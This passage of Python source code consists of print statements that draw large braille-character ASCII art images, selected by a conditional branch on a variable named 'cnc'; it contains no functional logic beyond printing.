            print('⠀⠀⠀⠀⠀⢸⠇⠀⠈⠠⠈⠀⠀⠀⠄⢨⣾⢻⡜⣣⢳⡹⡖⡽⣚⠦⣽⡿⢹⣿⠁⠀⡼⠁⠀⣠⠊⠀⠀⡠⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡷⣾⢱⣎⢧⣛⢶⣙⣣⢾⡹⣇⡷⣹⢎⣖⢳⡹⣌⡷⢎⡟⡿⣽⣦⣀⠇⣼⣿⢳⣽⢾⣻⣿⣟⡳⡼⢳⡹⣬⢳⡭⠳⣍⡾⠱⣏⡛⡽⣝⢯⡞⡼⣝⡿⣽⢀⡴⠛⠀⠀⠹⣿⣎⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⡟⠀⠀⠠⠀⢀⠀⠠⠀⠠⣼⣛⠵⣚⢥⡛⡼⣱⢣⡝⣹⢾⡇⠸⣇⣠⠞⠁⢀⠔⠁⢀⡤⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⡼⣗⣺⢎⡗⣮⣝⡲⣝⢶⢣⢧⢏⡾⡜⣆⢳⢎⡝⣎⣞⡹⡽⣻⣿⣸⣾⣿⣭⣫⣽⡟⣣⡓⣭⢹⡱⣗⣩⢻⠺⣏⡵⣛⡻⣜⢯⡳⡽⡞⣞⣽⢚⡽⣿⠏⠁⠀⠀⠀⠀⠸⣿⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⢸⠏⠀⠁⠠⠁⠠⠀⠂⠀⢲⡯⣝⠺⣥⢋⣞⡱⢣⣓⡞⣥⣿⠀⠀⠙⠶⣶⣚⣁⡤⠖⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⢷⡹⣒⡮⣜⢦⡝⡴⣎⢧⣛⢦⣛⡴⣛⣬⢏⡲⣜⠳⣜⢳⣹⣿⣿⠿⣏⡿⠟⢿⣿⣿⣕⣯⢾⠿⣖⡛⣟⡻⣟⣶⡙⣷⠱⣮⢳⡹⣔⠻⣖⣣⡟⣽⡏⠀⠀⠀⠀⠀⠀⠀⠙⢯⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⡼⠂⠀⠂⠀⠐⠀⠠⠐⢠⡿⠽⣌⡻⣔⣫⢼⣩⢧⢳⣜⢲⡿⠀⠀⠀⠀⠀⠉⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡟⣦⢗⡹⣴⢫⠶⣙⣞⡱⠲⣬⣓⢮⡱⢏⡼⡭⣝⣻⣿⣮⣷⣿⠿⣥⠛⡾⣇⣠⣘⡧⣛⣿⣳⢎⡿⣌⡗⣇⣷⣎⡷⣙⢎⡻⣱⢫⡝⣾⡹⢶⣳⢽⣞⡅⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⡆⠀⠀⠀⠀⠀⠀⠀⠀')              

        elif "FEMBOY" in cnc: 
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⡜⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢛⣿⣿⡿⠿⢿⡻⠿⠿⠿⣿⣟⣿⣭⣿⣷⣶⣤⣖⢶⡽⣮⢻⣿⣯⣭⣽⣛⣻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡰⡝⣿⣿⣿⡿⣻⡵⣣⣴⣶⣾⣿⣿⣿⣿⣿⢟⣭⣶⣿⢟⣼⣮⣅⡻⣿⣿⣿⣿⣶⣮⣝⡻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣮⠻⣷⢟⣵⣾⣿⣿⣿⣿⣿⣿⣿⡿⣫⡿⣿⣿⣧⣏⠹⣿⣿⣿⡝⣿⣿⣿⣽⣛⡻⢿⣷⣮⣛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⠇⣵⣿⣿⣿⣿⣿⣿⣿⣿⢟⡽⣵⢏⣼⣿⣿⢹⣿⠰⣿⣿⣿⣿⣞⢿⣿⣿⣿⣿⣷⣾⣜⠫⢷⣝⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⣡⡾⣿⣿⣿⣿⣿⡿⣻⡿⣡⣿⡹⢣⣾⣿⣿⡏⣺⢿⣆⢸⣿⣿⣿⣿⣎⢿⣿⣿⣿⣿⣿⣿⣷⣶⣬⣥⣙⣻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢞⡴⢫⣾⣿⣿⣿⢏⡿⣱⣟⢢⣿⡇⢣⣿⣿⣿⡿⡼⡞⡜⣿⡜⣿⣿⣿⣿⣿⡞⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣟⡯⣩⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣑⢱⢢⣿⣿⣿⡿⢡⣾⢡⡟⢢⣿⣿⠀⣼⣿⣿⣿⢣⢳⢣⢃⠹⣷⡜⣿⣿⣿⣿⣷⣿⠿⠿⣿⣿⣿⣟⣻⣽⡾⣫⣴⡼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣋⣵⣾⢣⢳⣿⣿⣿⡭⣡⡍⣇⡘⠀⣾⣿⡿⢠⣿⡿⣹⡟⣞⢏⢸⢧⡀⠙⢿⣜⢿⣿⣿⣿⢹⡝⣿⣿⣿⣿⣿⠟⣩⣾⣿⣿⣷⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢦⣿⡟⣾⣿⢳⢻⠱⢨⢞⢳⣿⣿⢃⣸⣿⢣⣿⢓⡛⣘⠸⡎⣿⣮⣎⡻⢷⣝⡻⣿⣸⡝⡜⣿⣿⢟⢕⡍⢹⣿⣿⣿⣿⡜⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠓⣿⡟⢸⣿⢣⢟⣯⡆⢳⣿⢸⣿⡏⡇⣿⡿⣸⢈⢹⣇⣿⢸⡖⣽⡻⣿⣿⣷⣾⣿⣿⣾⢱⢹⢛⡵⣫⣿⣿⠸⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡜⣿⠡⣾⡏⠐⠛⠛⢧⡺⣿⢸⣿⢻⢿⣿⡇⡟⡼⡿⢸⣿⠟⡗⣿⢸⣾⢹⣿⣿⣿⣿⣿⠸⣰⢨⣾⣿⣿⣿⡆⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠻⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠱⡡⡏⡇⣿⢧⡷⠉⠉⠁⠊⣿⡌⢸⢸⢸⣿⡇⢱⠳⣇⣚⢿⣶⢻⣿⢸⣿⣿⣿⣿⣿⣿⣥⣿⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢹⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢃⣼⢰⡇⣿⢿⠸⡇⣶⡄⢂⡠⣾⣧⡈⡄⢺⣿⠅⠀⠒⠒⠀⠏⡛⠎⣿⣼⡿⢿⣿⣿⣿⣿⣸⡇⣿⣿⣿⣿⣿⣿⢿⣿⣿⢻⣿⢇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⡏⢰⣿⠸⢀⢙⠼⢧⠾⣱⣿⣿⣷⡄⣎⢿⣧⣤⣀⠠⠄⠀⢈⢢⠈⣿⠇⣿⣿⡇⡿⡍⣿⢹⡏⣿⣿⢸⣿⡟⢸⣿⢇⣿⡿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⢿⣯⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣀⠿⢰⠸⡡⡃⣶⣮⣷⣿⣿⣿⣿⣶⣄⡻⠹⣇⠄⣠⣾⣆⣺⠇⡿⢴⣿⣿⢱⢇⢷⣏⣿⢤⣿⡟⣸⡿⡌⣾⡏⡾⡃⢧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿ ')
            print('⡟⣱⣶⣯⣿⣿⣇⢹⣿⣿⣿⣿⣿⣿⣟⣻⢿⣿⣿⣿⡆⣵⣷⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠧⣝⡛⠟⢫⠱⣿⢸⢳⣼⣿⢇⡟⡜⢸⡹⡟⣾⡟⡄⣿⠳⠇⣿⡼⣱⢇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿ ')
            print('⡇⠹⣿⣿⣿⣿⡇⣼⣿⣿⡏⣶⣮⣛⣼⣿⢸⣿⣿⣿⣿⡽⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⡍⠀⢠⠁⠁⢙⣎⠇⠀⣧⣿⠏⢞⣾⣇⠸⡿⣸⣿⣱⢳⠃⢕⡈⣇⣼⢏⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣦⣍⣛⣻⣿⣱⣿⣿⣿⣷⡹⡻⣿⣿⡟⣼⣿⣿⣿⣿⣿⣎⢿⣿⣿⣿⣿⣮⣿⣿⣿⣿⣿⣷⣶⢢⣥⣀⣼⣹⢢⢢⢹⢋⣠⡾⣽⡿⡴⠓⡿⡵⢣⢃⣴⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⣭⣽⣾⣿⣿⣿⣿⣿⣿⣿⣷⡝⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡏⠜⢧⢿⣿⢱⡿⢘⣽⢰⢏⡎⣵⣿⣿⣿⣷⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⣛⣿⠿⠿⠿⠿⠿⠿⠿⣿⣿⣛⣯⣽⣷⣴⢰⡎⡟⠀⢸⠓⠿⣿⡈⣾⣷⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⢶⣿⣿⢸⣿⣿⣿⣶⣿⣶⣶⣶⣶⣶⣾⠟⢫⣤⡹⣏⢃⠜⣿⣿⣿⣿⣿⣿⢟⣵⣿⢸⠀⠁⣤⣌⣸⣉⠒⠅⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⠿⣛⣛⣋⣀⢈⢿⣧⢻⡄⢀⣹⣿⣿⢟⣫⣾⣿⣿⠿⠀⠂⣠⣟⣟⣯⣽⣦⣴⠾⢺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢣⣿⣿⣿⣿⣿⣎⢆⢻⡎⣷⠀⣧⢹⣾⣿⣿⠟⢩⣠⣴⠶⣟⣻⢿⣭⣽⣿⣴⣾⣖⠼⣭⡻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣾⣿⣿⣿⣿⣿⣿⡊⠀⢻⢸⡆⣧⣿⡿⠋⣠⡶⣛⢥⣒⣯⣷⣿⠿⣿⣟⣛⣿⣯⣽⣶⣶⣾⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⢿⣿⢸⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢣⣿⣿⣿⣇⢿⣿⣿⠇⠀⠀⠛⡇⣿⢋⣴⠟⢁⡤⣒⣫⣽⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣛⣭⣿⣿⣯⣭⣛⡻⢿⣿⣿⣯⢿⢊⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⣛⢸⣿⣿⣿⣿⣿⣿⣿⡄⢸⣶⡄⠏⣵⠟⣁⣬⣶⣿⡿⢿⣿⠿⠛⠿⢿⣿⣿⣿⣿⣭⣽⣛⣛⡯⠜⣿⣿⣿⣿⣿⣿⣿⣿⢟⣵⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⢹⣿⣿⣿⣽⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣾⣿⣿⣿⣿⣿⣿⣇⠀⣞⣿⣿⣶⣶⣶⣶⣶⡖⠀⡃⢠⠺⣿⣿⣿⣿⣿⣿⣿⣟⣿⢿⣟⣿⣿⣿⣶⡝⢿⣿⣿⣿⡿⣡⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢀⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢻⣿⣿⣿⡿⣾⣿⢻⠀⣿⣿⣿⣿⣿⣿⣿⡟⢀⠆⣿⡏⣇⢿⣿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⢏⣾⣿⣿⣿⠿⣫⣵⣾⣷⣶⣭⣟⣫⣵⣾⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢱⢸⣿⣿⣿⡇⣿⣿⠘⣾⣿⣿⣿⣿⣿⣿⡿⡘⣼⠀⣿⣷⢿⢸⣿⣿⣿⡿⢉⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⢣⣿⣿⣿⡿⣱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢧⣿⢸⣿⣿⣿⣧⣿⣿⠴⢸⣿⣿⣿⣿⣿⣿⢇⢣⣿⡄⣿⣿⢸⡜⣿⣿⢟⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿⣧⣿⣿⣿⡟⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣭⣭⣭⣭⣭⣭⡝ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢺⣿⣾⣿⣿⣿⢿⣿⡏⢀⢸⣿⣿⣿⣿⣿⣿⢸⢸⡏⡇⠏⣿⡎⡇⣿⢯⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣸⣿⢸⣿⣿⣿⣱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⢸⣿⡇⠈⣾⣿⣿⣿⣿⣿⡟⡄⣿⢧⡇⠈⠿⣃⠃⢯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣱⣿⡯⣾⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡾⣿⣿⣿⣿⣿⢸⣿⣇⠐⣿⣿⣿⣿⣿⣿⣇⢁⣀⠀⢠⡂⣾⣵⡞⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣡⣛⣛⣃⣿⣿⣿⡇⣟⣛⣛⣛⣛⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢿⣿⣿⣿⣿⡏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⢃⢸⡇⣿⡟⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣱⣹⣿⣿⣿⢹⣿⣿⣿⡸⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡜⣿⣿⣿⣿⣿⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢸⡇⣿⣱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⢣⣿⣿⣿⣿⣇⢿⣿⣿⣿⣜⠿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢹⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡈⠡⢧⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⠟⣵⣿⣿⣿⣿⣿⣿⣎⢿⣿⣿⣿⡷⣬⡻⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⣿⣿⣿⣿⣾⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡷⣣⣿⣿⢟⣵⣿⣿⣿⣿⣿⣿⢟⣵⢣⣿⣿⣿⣿⣿⣿⣿⣿⣧⡻⣿⣿⣿⣟⢿⣮⡺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⣿⣸⣿⣿⠇⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣵⣿⡿⣣⣿⣿⣿⣿⣿⣿⢟⣵⣿⢏⡟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⡻⣿⣿⣷⣿⣿⣮⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣧⢻⣇⣿⡟⡿⣽⣿⡼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⢟⣼⣿⣿⣿⣿⣿⢟⣵⣿⣿⢏⣾⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⡻⣿⣿⣿⣻⣿⡜⣛⣛⣛⣛⣿⣿⣿⣿⣿⣿⣛⣛⣛⣛⣃ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣧⣻⣿⣿⣧⣷⣻⣷⢻⣿⣿⣿⣿⣿⣿⣿⣿⠻⣣⣿⣿⣿⣿⣿⢟⣵⣿⢟⡿⢳⣿⢟⡟⣎⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡞⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡜⣿⣷⣻⣿⣿⡸⣷⡹⣏⢿⣿⣿⣿⣿⣿⣿⢟⣼⣿⣿⣿⣿⣿⡿⣟⣿⡾⣫⢦⣿⣳⣿⡇⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣯⣿⡎⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢹⣷⢻⣿⣷⣿⣿⣧⢻⣿⡽⡜⣿⣿⣿⣿⣿⣣⣿⣿⣿⣿⣿⣿⣽⣾⣿⢟⣽⣏⣾⣳⣿⣿⣿⣿⢃⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⡞⣿⣿⣿⣿⣿⡸⣜⣿⣵⣹⣿⣿⣿⢳⣿⣿⣿⣿⣿⣿⣿⡿⣫⣶⣿⡿⣼⢣⣿⣿⣿⣸⡣⣟⣷⡝⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢹⣿⣿⣿⡏⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣧⢻⣿⣿⣿⡇⣧⢿⣞⢿⣗⢻⣿⢧⣿⣿⣿⣿⣿⣿⢟⣽⣾⣿⣿⣿⢳⣏⣾⣿⣿⡟⣳⢣⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣾⣿⣿⡿⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣹⣿⡼⣿⣿⣿⣧⢻⡼⡿⣧⡻⣷⡍⣾⣿⣿⣿⣿⣻⣵⣿⣟⣯⣷⣿⢇⡟⣾⣿⣿⢟⣵⣏⣿⣿⣿⣿⢨⢻⣿⣿⣿⣿⣿⣿⡿⣫⣾⣿⣿⡿⣱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣷⣻⣷⢻⣿⣿⢿⠸⣧⢿⣮⡻⣮⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡞⡼⣽⣿⣿⣫⣾⢏⣾⣿⣿⣿⣿⢸⣧⢻⣿⣿⣿⡿⣫⣾⣿⣿⣿⢟⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
            print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣼⣿⣷⣻⣧⢿⣿⣿⢸⡿⣏⣿⣿⢣⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣼⣿⣿⢟⣵⡿⣫⣾⣿⣿⣿⣿⣿⢸⣿⣧⣻⡿⣫⣾⣿⣿⣿⡷⣫⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
